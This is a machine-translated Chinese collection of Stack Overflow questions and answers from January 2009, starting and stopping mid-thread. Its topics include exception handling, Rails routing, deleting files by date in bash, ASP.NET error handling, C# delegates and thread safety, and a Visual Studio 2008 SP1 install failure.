> 时间：2009-01-12T08:55:26.277

我喜欢在控制器中处理处理从视图触发的事件的处理程序。如果异常提供了强有力的安全保证，这是一个有用的捕获点，因为它的级别足够高，可以报告错误，并且处理程序通常是原子的并且与用户刚刚完成的事情相关，因此希望他们能够解决这是怎么回事。

```
void Controller::on_edit_entity( const Entity& entity ) {
    try {
        Command::ptr command = new EditEntityCommand( entity );
        push_command( command );
    }
    catch ( const std::exception& exception ) {
        fprintf( stderr, "%s.\n", exception.what() );
    }
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-12T10:27:07.310

在Delphi Windows 应用程序中，应用程序的主消息处理循环（即在调用堆栈的底部）通过显示一个消息框来处理您的异常。在我看来，这是处理异常的最佳场所。

通过在您自己的方法中捕获异常以向用户显示消息框的唯一目的，您拒绝任何调用您的方法的代码知道异常实际发生并且该方法实际上失败了。

我只会在以下情况下处理异常：

*   我需要进行一些清理（如数据库回滚），在这种情况下，我会在清理完成后重新引发异常。
*   我有更多信息要添加到异常中。
*   尽管有例外，我的方法可以成功实现其目的。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2009-01-12T09:03:14.560

两个地方：

*   在所有事件处理程序中
*   catch 可以做一些有用的事情的任何位置，比如用对调试有用的信息来补充异常​​。通常，将使用此信息创建一个新异常并抛出。请注意，此新异常的 InnerException（或非 .NET 等效项）应设置为原始异常的异常，以便保留堆栈跟踪之类的内容。

# ruby-on-rails - 如何将灵活数量的 id 传递给 Rails 中的控制器？

> ID：434840
> 
> 赞同：2
> 
> 时间：2009-01-12T08:54:25.857
> 
> 标签：ruby-on-rails, ruby, url

我想显示一个比较页面，以便用户可以比较我数据库中几个对象的属性。可以比较任意数量的对象。我也希望它可以加入书签（所以是“get”）。

我应该如何为控制器构建我的 URL / 路由？

/foo_compare/1_5_22 之类的东西，我在控制器中将 id 拆分为 1、5 和 22？

也许 /foo_compare/1/5/22，但我将如何设置路线？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-12T13:34:22.907

我更喜欢

```
/compare?a=1&b=5&c=22 
```

1_5_22 太丑了，我认为

```
/compare/1/5/22 
```

是一个非常非 RESTful 的路由。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-12T09:26:36.557

```
a) url_for(:controller => "my_controlelr",:action => "compare", :id => [1,2,3,4]) becomes "id"=>"1/2/3/4" 
```

链接将是 my_controlelr/compare/1/2/3/4

```
b) url_for(:controller => "my_controlelr",:action => "compare", :ids => [1,2,3,4]) becomes "ids" => ["1", "2", "3", "4"] 
```

链接将是 my_controlelr/compare/?ids[]=1&ids[]=2&ids[]=3&ids[]=4

无需特殊路线

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-12T10:03:51.177

```
# routes.rb
map.connect 'compare/*:comparisons', :controller => 'whatever', :action => 'you_name_it'

# in the controller
ids = params[:comparisons].split('/') 
```

这映射到例如 /compare/1/5/203。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-14T00:47:40.207

虽然我不喜欢下划线，但我认为分隔的方法是合理的。我可能会使用';'

从逻辑上讲，这是一组 ID，将它们公开为一系列参数并不是很好，除非你真的想对它们的数量实施限制

# sql - sql 检测更新触发器（sql server 2005）中修改的字段？

> ID：434842
> 
> 赞同：3
> 
> 时间：2009-01-12T08:55:17.103
> 
> 标签：sql, sql-server, sql-server-2005, triggers

在 sql server 2005 中，在更新触发器中，有一种方法可以找到由原始更新查询修改的字段\列的列表。

我有一个包含 150 列的表，并且在触发器内部需要知道是否只更新了一个特定字段（并且没有修改其他字段）

我可以写一个很长的 sql 来比较 150 列，但它很容易出错并且看起来很愚蠢！

解决这个问题的任何体面的方法。我希望一些 sql2005 api 能来救我。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-12T09:05:19.750

看看[COLUMNS_UPDATED](http://msdn.microsoft.com/en-us/library/ms186329.aspx) - 这有点痛苦，但你应该能够很容易地使用它来满足你的要求。[SQL Server Central](http://www.sqlservercentral.com/articles/Triggers/triggerscolumnsupdated/115/)上有一篇关于它的不错的文章。

# linux - 有没有什么简单的方法可以在bash中使用'rm'-'按日期删除'？

> ID：434851
> 
> 赞同：8
> 
> 时间：2009-01-12T09:01:54.673
> 
> 标签：linux, bash, date, rm

我今天注意到（在愉快地使用 bash 大约 8 年之后）没有使用“rm”“按日期删除”的简单方法。因此，解决方案是围绕 rm、ls、find、awk 和 sed 等命令组合进行管道传输。

例如，我想从 2009 年删除工作目录中的每个文件，典型的方法是什么？

我想出了以下内容，这很丑陋，只有在将“rm”设置为跳过目录时才应该运行（否则您将删除父目录）：

```
ls -la | awk '{if (substr($6,0,5)==2009) print $8}' | xargs rm 
```

最优雅和最过分设计的解决方案都得分。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-01-12T09:06:55.817

我会结合 find 和 rm （没有管道）

```
find .  ...bunch of find criterias to select certain files (e.g. by date) .... -exec rm \{\} \; 
```

编辑：使用您的示例的参数，它将是

```
find . -maxdepth 1 -type f -ctime -12 -exec rm \{\} \; 
```

警告：这仅在今天有效:-)。（为了让它每次都能正常工作，请将 -ctime 替换为绝对时间，参见手册页中的 timeXY ）

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-01-12T09:32:39.883

某些版本的 find 支持 -delete 选项，使其更加高效...

```
find . -maxdepth 1 -type f -ctime -12 -delete; 
```

检查您的查找手册页（这对我来说适用于最新版本的 Ubuntu）

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-12T09:33:02.643

我会使用：

```
find . -maxdepth 1 -type f -newerct 'jan 1' -print0 \
    | xargs -0 rm 
```

（或者`-newermt`如果你想过滤修改时间）

请注意，-newerXY 的“t”形式据称允许任何与 cvs 兼容的日期格式（请参阅[doco](http://cvsdoc-zh.gro.clinux.org/cvsdoc/en/html/1_12_13/Date-input-formats.html)）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T09:17:20.117

`find(1)`做你想做的事情比解析`ls(1)`输出更有效率。

编辑：要注意的是其中包含空格的文件名，因此您想要一个`find`支持`-print0`（与 一起使用`xargs -0`）以获得更好的性能。

```
find . -mtime +12 -print0 | xargs -0 rm -f 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-12T09:32:08.027

而不是解析很容易破坏的ls（1），你应该依赖stat（1）：

```
stat -c '%z/%n' files_or_glob | grep '^date' | cut -d/ -f2- | xargs -d '\n' rm -i 
```

例如

```
$ stat -c '%z/%n' *| grep '^2008-12-16' | cut -d/ -f2- | xargs -d '\n' rm -i 
```

注意：这不会正确处理嵌入换行符的文件名。然而，它们很少在野外发现

# java - 操作系统推荐在非常基本的硬件上运行 Java Swing App

> ID：434855
> 
> 赞同：4
> 
> 时间：2009-01-12T09:04:18.193
> 
> 标签：java, swing

我们有一个客户端/服务器 POS 应用程序。

对于 Java Swing 客户端，我们正在评估一个具有非常基本硬件的系统

*   Celeron 300 CPU 可扩展至 PIII 1.2 Ghz。
*   810E主板。
*   **64 MB SD RAM，DIMM**，可扩展至 256 MB。
*   4.3 GB 硬盘可扩展至 80 GB 及以上。
*   10 / 100，用于连接服务器的以太网 / 局域网卡，宽带 --- 连接等。
*   56 Kbps 传真调制解调器语音 V 90。
*   声卡。
*   紧凑型键盘。
*   内置 2 个立体声扬声器。
*   键盘内置触摸​​板鼠标。
*   3 个 USB 1.1 端口。
*   14" 彩色显示器，0.28 DP，1024 x 768 集成。

是否可以在具有 64MB RAM 的系统上运行 Java Swing 应用程序？如果是，你会推荐什么轻量级的免费操作系统？（Puppy Linux，还有别的吗？）

该系统只需要运行 Java Swing 应用程序。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-02T00:39:10.017

在 64MB 中运行一个中等大小的 Swing 应用程序绝对是可能的。哎呀，在 Java 1.2 时代，64MB 被认为是一台不错的开发机器，事实上，我在 64MB Linux 机器上使用 Netbeans 进行了一些我的第一次 Java 编程。

除了精简的 Linux 发行版之外，您还应该调查使用哪个 JVM。在较旧的 VM 上运行可能是个好主意，因为它们旨在使用更少的 RAM。您还应该研究Sun 的 JVMS（可能也有其他人）提供的用于微调内存使用的[命令行选项。](http://java.sun.com/javase/technologies/hotspot/vmoptions.jsp)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-12T09:37:00.110

看看各种[JEOS](http://en.wikipedia.org/wiki/Just_enough_operating_system_(JeOS))风格（“恰到好处的操作系统”）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-13T10:17:47.233

我建议在 RAM 和磁盘空间方面使用这些规范创建一个虚拟机（在 vmware/virtualbox/whatever 中），然后做一些实验。应用程序的瓶颈是什么 - CPU 使用率？显卡更新速度？JVM 的内存使用情况？磁盘IO？

如果你想使用 Linux，我个人会从研究 Damn Small Linux 开始。

您很可能需要找到一个在可嵌入时运行良好的 JVM，因为普通的 Sun JVM 使用内存来提高速度。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-12T09:35:41.593

您可能还想考虑实际应用程序的内存要求。它不仅仅是“摇摆”，因为您不能假设任何可以处理摇摆的规范都可以处理您的应用程序。

# asp.net - 处理 ASP.NET 应用程序的 global.asax 中的 Application_Error

> ID：434859
> 
> 赞同：27
> 
> 时间：2009-01-12T09:06:52.773
> 
> 标签：asp.net

我希望在应用程序崩溃时向管理员发送邮件。所以我只是这样做`global.asax`：

```
void Application_error(object sender, EventArgs e)
{
    SendMessageToAdministarator(Server.GetLastError().ToString());
} 
```

但实际上多次`Application_Error`调用，即使应用程序不会崩溃。

而且我希望仅在应用程序崩溃时向管理员发送邮件。

另外，我是否有一种简单的方法可以重新启动应用程序？

我正在寻找最简单的解决方案。

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2009-01-12T09:18:22.237

当应用程序没有崩溃时会发送什么样的错误？您可以检查异常的类型，并且不要针对不会使应用程序崩溃的异常发送电子邮件（例如，重定向可能会引发我在代码中手动过滤的 ThreadAbortException）：

```
protected void Application_Error(Object sender, EventArgs e)
{
    Exception ex = Server.GetLastError();
    if (ex is ThreadAbortException)
        return;
    Logger.Error(LoggerType.Global, ex, "Exception");
    Response.Redirect("unexpectederror.htm");
} 
```

您可以将重定向添加到错误页面，并向用户显示发生错误的消息以及指向站点中相关页面的一些链接。这是为了“重新启动应用程序” - 我希望这是您想要的。

此外，您可能会考虑使用 log4net 进行日志记录，它还可以在服务器上记录错误*并*在错误时发送电子邮件。

# c# - 如何检查连接字符串是否有效？

> ID：434864
> 
> 赞同：86
> 
> 时间：2009-01-12T09:09:20.477
> 
> 标签：c#, connection-string

我正在编写一个用户手动提供连接字符串的应用程序，我想知道是否有任何方法可以验证连接字符串 - 我的意思是检查它是否正确以及数据库是否存在。

* * *

## 回答 #1

> 赞同：158
> 
> 时间：2009-01-12T09:10:14.000

你可以尝试连接吗？对于快速（离线）验证，也许用于`DbConnectionStringBuilder`解析它......

```
 DbConnectionStringBuilder csb = new DbConnectionStringBuilder();
    csb.ConnectionString = "rubb ish"; // throws 
```

但是要检查数据库是否存在，您需要尝试连接。如果您知道提供者，最简单的方法当然是：

```
 using(SqlConnection conn = new SqlConnection(cs)) {
        conn.Open(); // throws if invalid
    } 
```

如果您只知道提供程序是一个字符串（在运行时），那么使用`DbProviderFactories`：

```
 string provider = "System.Data.SqlClient"; // for example
    DbProviderFactory factory = DbProviderFactories.GetFactory(provider);
    using(DbConnection conn = factory.CreateConnection()) {
        conn.ConnectionString = cs;
        conn.Open();
    } 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2014-03-28T09:11:10.203

试试这个。

```
 try 
    {
        using(var connection = new OleDbConnection(connectionString)) {
        connection.Open();
        return true;
        }
    } 
    catch {
    return false;
    } 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2015-10-21T15:04:12.180

如果目标是有效性而不是存在，则以下方法可以解决问题：

```
try
{
    var conn = new SqlConnection(TxtConnection.Text);
}
catch (Exception)
{
    return false;
}
return true; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-09-15T07:42:24.827

对于 sqlite，请使用：假设您在文本框 txtConnSqlite 中有连接字符串

```
 Using conn As New System.Data.SQLite.SQLiteConnection(txtConnSqlite.Text)
            Dim FirstIndex As Int32 = txtConnSqlite.Text.IndexOf("Data Source=")
            If FirstIndex = -1 Then MsgBox("ConnectionString is incorrect", MsgBoxStyle.Exclamation, "Sqlite") : Exit Sub
            Dim SecondIndex As Int32 = txtConnSqlite.Text.IndexOf("Version=")
            If SecondIndex = -1 Then MsgBox("ConnectionString is incorrect", MsgBoxStyle.Exclamation, "Sqlite") : Exit Sub
            Dim FilePath As String = txtConnSqlite.Text.Substring(FirstIndex + 12, SecondIndex - FirstIndex - 13)
            If Not IO.File.Exists(FilePath) Then MsgBox("Database file not found", MsgBoxStyle.Exclamation, "Sqlite") : Exit Sub
            Try
                conn.Open()
                Dim cmd As New System.Data.SQLite.SQLiteCommand("SELECT * FROM sqlite_master WHERE type='table';", conn)
                Dim reader As System.Data.SQLite.SQLiteDataReader
                cmd.ExecuteReader()
                MsgBox("Success", MsgBoxStyle.Information, "Sqlite")
            Catch ex As Exception
                MsgBox("Connection fail", MsgBoxStyle.Exclamation, "Sqlite")
            End Try
          End Using 
```

我认为您可以轻松地将其转换为 c# 代码

# java - 如何重命名文件名而不更改其类型？

> ID：434865
> 
> 赞同：1
> 
> 时间：2009-01-12T09:09:33.457
> 
> 标签：java, file-handling

我对重命名 java 文件有疑问...我的应用程序必须重命名传入的文件，即 mdb、dbf、xls、xml 等。格式。我使用了以下源代码。

例如：

```
String filename = "D:/sample.mdb";
File filediriden = new File(filename);
String[] filetype = filename.split("\\.");
System.out.println("Filetype :"+filetype[1]);
String newfilename = "D:/new."+filetype[1];
File newfilediriden = new File(newfilename);
System.out.println("New File Name "+newfilename);
boolean rename = filediriden.renameTo(newfilediriden);
if(rename)
   System.out.println("File Renamed");
if(filediriden.isFile()){
    System.out.println("filename" + filediriden.getName());
}else{
    System.out.println("not a filename");
} 
```

* * *

```
OUTPUT:
Filetype  : mdb
New File Name D:/new.mdb
File Renamed
not a filename 
```

之后我检查了它是否是一个文件，但它没有进入那个......帮助请......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T09:18:44.420

```
boolean rename = filediriden.renameTo(newfilediriden);
if(filediriden.isFile()){ 
```

重命名文件后，旧的 File 对象 ( *filediriden* ) 仍指向旧名称，该名称不再存在。您想使用新的 File 对象 ( *newfilediriden* ) 进行检查。

```
filetype[1] 
```

此外，文件中可能包含多个点，因此*filetype[filetype.length-1]*可能更安全。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T09:19:11.503

问题是您正在检查 filedirden 而不是 newfiledirden。
在测试点，filedirden 不再存在，因为它指向的文件已被重命名。

# c# - 如何阻止异常破坏我的委托链？

> ID：434873
> 
> 赞同：8
> 
> 时间：2009-01-12T09:12:25.197
> 
> 标签：c#, exception, exception-handling, delegates

我遇到了一个常见的问题。当我有一个事件可能被几个不同的类订阅时，这些类之一抛出的异常将终止回调链；因为我不知道执行回调的先验顺序，这可能会导致某些类的不可预测的状态更改，而不是其他类。

在圣经中（[通过 C# 的 CLR](http://www.microsoft.com/learning/en/us/books/6522.aspx)，我使用的是 C# 2.0）有一小段关于使用`MulticastDelegate.GetInvocationList`来解决这个问题，但仅此而已。所以我的问题是：处理这个问题的最佳方法是什么？我`MulticastDelegate.GetInvocationList`每次有活动都必须使用吗？或者我是否需要将所有可能作为委托链的一部分调用的方法包含在某种回滚机制中？与在 C# 中如此易于使用的简单事件/委托模型相比，为什么所有这些选项都如此复杂？我怎样才能使用简单的方法而不会导致损坏状态？

谢谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-01-12T09:19:14.793

如果您只是调用一个委托，它将按顺序调用所有目标方法。如果您想单独执行它们，则需要使用`GetInvocationList`它们 - 例如：

*   每次检查`Cancel`后
*   捕获每个的返回值
*   在单个目标失败后继续

至于使用它的最佳方式：您希望它如何表现？我不清楚......例如，这可能非常适合扩展方法：

```
static void InvokeIgnoreErrors(this EventHandler handler,
        object sender) {
    if(handler != null) {
        foreach(EventHandler subHandler in handler.GetInvocationList()) {
            subHandler(sender, EventArgs.Empty);
        }
    }
} 
```

然后你可以打电话`myHandler.InvokeIgnoreErrors(this);`（例如）。

另一个例子可能是：

```
static bool InvokeCheckCancel(this CancelEventHandler handler,
        object sender) {
    if(handler != null) {
        CancelEventArgs args = new CancelEventArgs(false);
        foreach(CancelEventHandler subHandler in handler.GetInvocationList()) {
            subHandler(sender, args);
            if(args.Cancel) return true;
        }
    }
    return false;
} 
```

在第一个事件请求取消后停止。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T11:12:43.707

我认为您应该查看事件处理程序，而不是更改调用事件的方式。在我看来，应该始终编写事件处理程序方法，以便它们是“安全的”并且永远不会让异常传播。当您在 GUI 代码中处理由外部代码调用事件的事件时，这一点尤其重要，但始终是一个好习惯。

# c# - 我应该如何教我的朋友 C#？

> ID：434888
> 
> 赞同：2
> 
> 时间：2009-01-12T09:23:06.050
> 
> 标签：c#

我对 java 的熟悉程度很好，我想教我的朋友 C#（无论如何我都不会认为自己是专家）。从面试的角度来看，在我可以从面试的角度教她之前，我应该在 C# 中学习/实现自己什么。我不是特定语言面试的忠实粉丝，但我的朋友几乎没有编程经验。

编辑：您建议在面试时学习 C# 语言的哪些最重要方面。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T09:53:59.263

我倾向于认为你应该在面试中知道的事情就是你在核心开发中需要知道的事情——至少如果面试官很好的话。

因此，对于 C#，我会确保您对以下内容感到满意：

*   特性
*   引用类型与值类型
*   参数传递（ref 的含义等）
*   泛型（与 Java 完全不同）
*   代表和活动
*   “使用”语句
*   异常处理

涉及更多：

*   可空值类型
*   部分类型
*   迭代器块（玩起来很有趣）

如果您想处理 C# 3：

*   Lambda 表达式
*   扩展方法
*   基本掌握查询表达式的处理方式（即语法糖；细节不那么重要）
*   对象和集合初始化器

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T09:53:26.207

好吧，首先我会尽量避免由于与 java 概念混淆而导致的错误（因为你来自 java 背景）。例如：

*   int/Int32 (etc)：在 C# 中它们是相同的
*   泛型：它们与 java 有何不同
*   代表/事件：在java中不存在
*   闭包：java捕获*值*；C# 捕获*变量*（允许更新）
*   结构，它们是如何工作的，以及为什么你很少需要它们；-p

但 C# 不是一门小语言，.NET 框架非常庞大。所以有很多东西要覆盖...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T09:54:24.597

我发现学习 C# 绝对最好的方法是从事你觉得有趣的小项目。如果您发现该项目很有趣，那么编写大量代码会容易得多，如果您想学习编码，这就是全部内容。我认为熟悉一种语言并能够在其抽象中思考比了解任何特定方面更重要。例如，在面试时他们可能会要求您快速设计一些简单的程序，如果您熟悉用该语言编写通用程序，您应该能够将这些知识转移到设计中。

如果您的目标是在一家特定公司进行面试，并且您知道他们的工作对象是什么，那么当然有些科目可能比其他科目更适合学习，但这是针对具体情况的。

我真正进入一门新语言的首选策略是阅读一本涵盖大部分基本语言功能的书，以便您了解所有可能无法从随机网络教程中学到的小运算符、函数和其他细节。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T09:56:53.097

主要看你朋友以前的编程经验。首先，如果他没有面向对象编程的经验，他应该专注于理解它的基本方面。

Then it would be important to focus on language specific aspects: c# has particular class attributes access methods (readonly, get and set modifiers, etc..) and complex method and attributes overloading and overriding directives.

And finally he should focus on .NET platform structure.

[This tutorial](http://www.csharp-station.com/Tutorial.aspx) gives a good guide to start programming in c# from scratch, and the [wikipedia page on .NET framework](http://en.wikipedia.org/wiki/.NET_Framework) gives a good technological overview on the platform.

# c# - 字符串属性本身是线程安全的吗？

> ID：434890
> 
> 赞同：32
> 
> 时间：2009-01-12T09:23:14.600
> 
> 标签：c#, multithreading

C# 中的字符串是不可变的和线程安全的。但是当你有一个公共的 getter 属性时呢？像这样：

```
public String SampleProperty{
    get;
    private set;
} 
```

如果我们有两个线程，第一个在“同一”时间调用“get”，第二个在“同一”时间调用“set”，会发生什么？

恕我直言，该集合必须像这样使锁成为线程安全的：

```
private string sampleField;
private object threadSafer = new object();

public String SampleProperty{
    get{ return this.sampleField; }
    private set{
        lock(threadSafer){
            sampleField = value;
        }
    }
 } 
```

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2009-01-12T10:36:21.860

大多数答案都使用“原子”一词，好像只需要原子更改。他们不是，通常。

这已在评论中提到，但通常不会在答案中 - 这是我提供此答案的唯一原因。（关于以更粗粒度锁定以允许附加等操作的观点也是完全有效的。）

通常你想要一个阅读线程来查看变量/属性的*最新*值。[atomicity 不能保证](http://pobox.com/~skeet/csharp/threads/volatility.shtml)这一点。举个简单的例子，这是停止线程的一种*不好的方法：*

```
class BackgroundTaskDemo
{
    private bool stopping = false;

    static void Main()
    {
        BackgroundTaskDemo demo = new BackgroundTaskDemo();
        new Thread(demo.DoWork).Start();
        Thread.Sleep(5000);
        demo.stopping = true;
    }

    static void DoWork()
    {
         while (!stopping)
         {
               // Do something here
         }
    }
} 
```

`DoWork`尽管对布尔变量的写入是原子的，但可能会永远循环 - 没有什么可以阻止 JIT 缓存`stopping`in的值`DoWork`。要解决此问题，您需要锁定、生成变量`volatile`或使用显式内存屏障。这也适用于字符串属性。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2009-01-12T09:31:38.043

引用类型字段的 get/set (ldfld/stfld) 是 (IIRC) 保证是原子的，因此这里不应该有任何损坏的风险。**所以从这个**角度来看它应该是线程安全的，但我个人会将数据锁定在更高级别 - 即

```
lock(someExternalLock) {
    record.Foo = "Bar";
} 
```

或许：

```
lock(record.SyncLock) {
    record.Foo = "Bar";
} 
```

这使您可以像原子操作一样对同一个**对象**进行多次读取/更新，从而使其他线程无法获得无效的对象状态

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-12T09:31:57.793

设置字符串是一个原子操作，即你要么得到新字符串，要么得到旧字符串，你永远不会得到垃圾。

如果你正在做一些工作，例如

```
obj.SampleProperty = "Dear " + firstName + " " + lastName; 
```

然后字符串连接都发生在调用 set 之前，因此 sampleField 将始终是新字符串或旧字符串。

但是，如果您的字符串连接代码是自引用的，例如

```
obj.SampleProperty += obj.SampleProperty + "a"; 
```

以及您在另一个线程上的其他位置

```
obj.SampleProperty = "Initial String Value"; 
```

然后你需要锁。

考虑一下您正在使用 int。如果您分配给 int，并且您从 int 获得的任何值都是有效的，那么您不需要锁定它。

但是，如果 int 保持对两个或多个线程处理的小部件数量的计数，为了使计数准确，您需要锁定 int。字符串的情况相同。

我感觉我没有很好地解释这一点，希望对您有所帮助。

谢谢

体重

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T09:32:03.550

这是线程安全的，无需任何锁定。字符串是引用类型，因此只有对字符串的引用被修改。引用的类型保证是原子的（32 位系统上的 Int32 和 64 位上的 Int64）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-12T09:32:21.477

*您的第二个代码示例绝对不正确，因为锁仅在用于访问变量的所有*位置（用于获取*和*设置）时才具有所需的效果，因此`get`还需要锁。

但是，当获取和设置引用类型字段作为这样的属性时，添加锁定语句不会添加任何值。在 .NET 环境中，指针的分配保证是原子的，如果多个线程正在更改一个属性，那么无论如何你都有一个固有的竞争条件（线程可能会看到不同的值；这可能是也可能不是问题）所以几乎没有锁定点。

因此，对于它的作用，第一段代码很好。但是你是否真的想在多线程应用程序中构建固有的竞争条件是另一回事。

# xml - 使用 NUnit 报告

> ID：434895
> 
> 赞同：1
> 
> 时间：2009-01-12T09:24:38.230
> 
> 标签：xml, vb.net, nunit

从 NUnit 执行测试后，我想获得一份管理报告。通过查看 NUnit，它似乎生成了 XML 格式的输出。请任何人都可以就如何实现这一点提出建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T11:27:16.907

您可以使用 NUnit 网站上提供的工具：NUnitResults 或 NUnit-Summary。我没有尝试过其中任何一个，但这就是我要开始的地方。

您可能还需要考虑将单元测试作为使用 CruiseControl.NET 的自动构建的一部分来运行。CruiseControl 为每个构建生成非常有用的摘要报告，报告运行的测试次数、失败次数、花费的时间，以及所有失败的详细信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T10:22:52.513

您可以使用[XSLT](http://www.w3schools.com/xsl/)将您的 xml 转换为更漂亮的东西。

# c# - ReSharper 语法建议

> ID：434897
> 
> 赞同：3
> 
> 时间：2009-01-12T09:24:45.610
> 
> 标签：c#, visual-studio-2008, syntax, resharper

以下语句中的 if 关键字由 ReSharper 用绿色下划线：

```
if (readOnlyFields.Contains(propertyName)) return false;

return base.CanWriteProperty(propertyName); 
```

ReSharper 建议进行以下更改：

```
return !readOnlyFields.Contains(propertyName) 
    && base.CanWriteProperty(propertyName); 
```

为什么这“更好”？我发现当前代码更具可读性，据我所知，结果应该是相同的。有什么想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T09:49:05.920

两者都不是更好，因为任何一个都会比另一个表现更好。（任何差异都将完全可以忽略不计。）

某些编码约定建议您为每个函数使用一个 return 语句，以便于理解它的流程。不过，这不是一个硬性规定，在这种情况下，发生了什么很明显。如果你不喜欢它的建议，但你想确保你的代码很容易被其他人阅读，我建议如下：

```
if (readOnlyFields.Contains(propertyName)) return false;
else return base.CanWriteProperty(propertyName); 
```

不过你的方法也不错。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T09:28:50.937

在快速修复菜单（Alt+Enter）上，有一个“更正选项”（或类似的东西）。您可以将此特定建议变成提示，或完全关闭它。

就个人而言，我更喜欢您的原件而不是 ReSharper 的建议。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-12T09:32:48.417

有些人讨厌从函数中获得多个回报。

编程中的所有厌恶似乎都随着时间的流逝而起起落落，而这种特殊的厌恶目前并不是特别流行。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-12T09:55:04.003

在这种情况下，“可读性”很大程度上受读者个人风格的影响。一旦你习惯了以某种格式写东西，你也会习惯于以同样的方式阅读它。

例如，我会接受 ReSharper 的建议。但这只是个人喜好问题，再加上我在行尾发现 return 语句也不是非常易读的事实。当所有关键字都在行首时，扫描代码会稍微容易一些。

同样，没有“真正的答案”。您可以禁用该建议并使用您习惯的任何内容。

# visual-studio - VS 2008 Service Pack 1 问题

> ID：434899
> 
> 赞同：0
> 
> 时间：2009-01-12T09:25:59.693
> 
> 标签：visual-studio, installation, visual-studio-2008-sp1

我的 OPS 是 XP 并安装了 service pack 3。我无法安装 vs2008 service pack1，在日志文件中我看到“Visual C++ 2008 SP1 Design-Time Components for x86 - KB947888”无法安装。错误代码是 1603。安装文件的最后一部分在这里。

```
返回 IDOK。安装错误
[错误 1335。
    此安装所需的压缩包文件“patch.cab”已损坏且无法使用。
    这可能表示网络错误、从 CD-ROM 读取错误、
    或者这个包有问题。]
[2009 年 1 月 12 日，10:14:50]
   (IronSpigot::MsiExternalUiHandler::UiHandler)
   返回 IDOK。INSTALLMESSAGE_ACTIONSTART
   [行动 10:14:50：回滚。回滚动作：]
[2009 年 1 月 12 日，10:17:29]
   （IronSpigot::MspInstallerT<class ATL::CStringT<unsigned short,class ATL::StrTraitATL<unsigned short,class ATL::ChTraitsCRT<unsigned short> >> >::PerformMsiOperation）
   补丁（C:\DOCUME~1\Cem\LOCALS~1\Temp\Microsoft Visual Studio 2008 SP1\VS90sp1-KB945140-X86-ENU.msp；
              C:\DOCUME~1\Cem\LOCALS~1\Temp\Microsoft Visual Studio 2008 SP1\VC90sp1-KB947888-x86-enu.msp)
              在产品上安装失败（Microsoft Visual Studio 2008 专业版 - ENU）。
   微星日志：
      Microsoft Visual Studio 2008 SP1_20090112_100005671-Microsoft Visual Studio 2008 专业版-ENU-MSP0.txt
[2009 年 1 月 12 日，10:17:29]
    （IronSpigot::MspInstallerT<class ATL::CStringT<unsigned short,class ATL::StrTraitATL<unsigned short,class ATL::ChTraitsCRT<unsigned short> >> >::PerformMsiOperation）
    MsiApplyMultiplePatches 返回 0x643

```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2010-03-03T16:12:15.427

我遇到了类似的错误，问题是iso文件，即使损坏（例如通过不稳定的下载）仍然可以成功解压缩和/或安装/刻录。我重新下载了iso，安装了新的iso，安装没有问题...然后我观察到失败iso的md5哈希与有效的iso之间的差异...确保您的vs2008 sp1 iso具有此哈希到验证损坏的 iso 文件是否不是原因：

MD5 哈希 = 0C5C6B7E4E80B66CD299B1DBA6A819DB

SHA-1 哈希 = 2459232F67B38594DE192778020145DCD0B0DF9F

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-23T22:35:39.570

该程序正在访问 c:\config.msi 文件夹并且它没有获得特权。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T09:44:34.993

如果您下载了 SP1，请重新下载。也可能是您的机器中没有足够的内存供安装程序解压补丁。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T10:00:03.930

没有divo，我认为问题取决于我机器中的程序（如第三方程序）。我现在正在下载sp作为iso文件。但我认为它不会解决问题。

# javascript - JavaScript 函数参数

> ID：434904
> 
> 赞同：1
> 
> 时间：2009-01-12T09:28:34.633
> 
> 标签：javascript, function, types, parameters

我试图将一个数字传递给我的 JavaScript 函数，但实际上传递了一个错误的值。我在这里给出整个代码：

```
<html>
<head>
<script type="text/javascript">
function test(num)
{
/*It should alert as 01004 or 1004 but to my surprise it's alerting as 516!*/
alert(num);
}
</script>
</head>
<body>
<a href="javascript:test(01004);">Test it!</a>
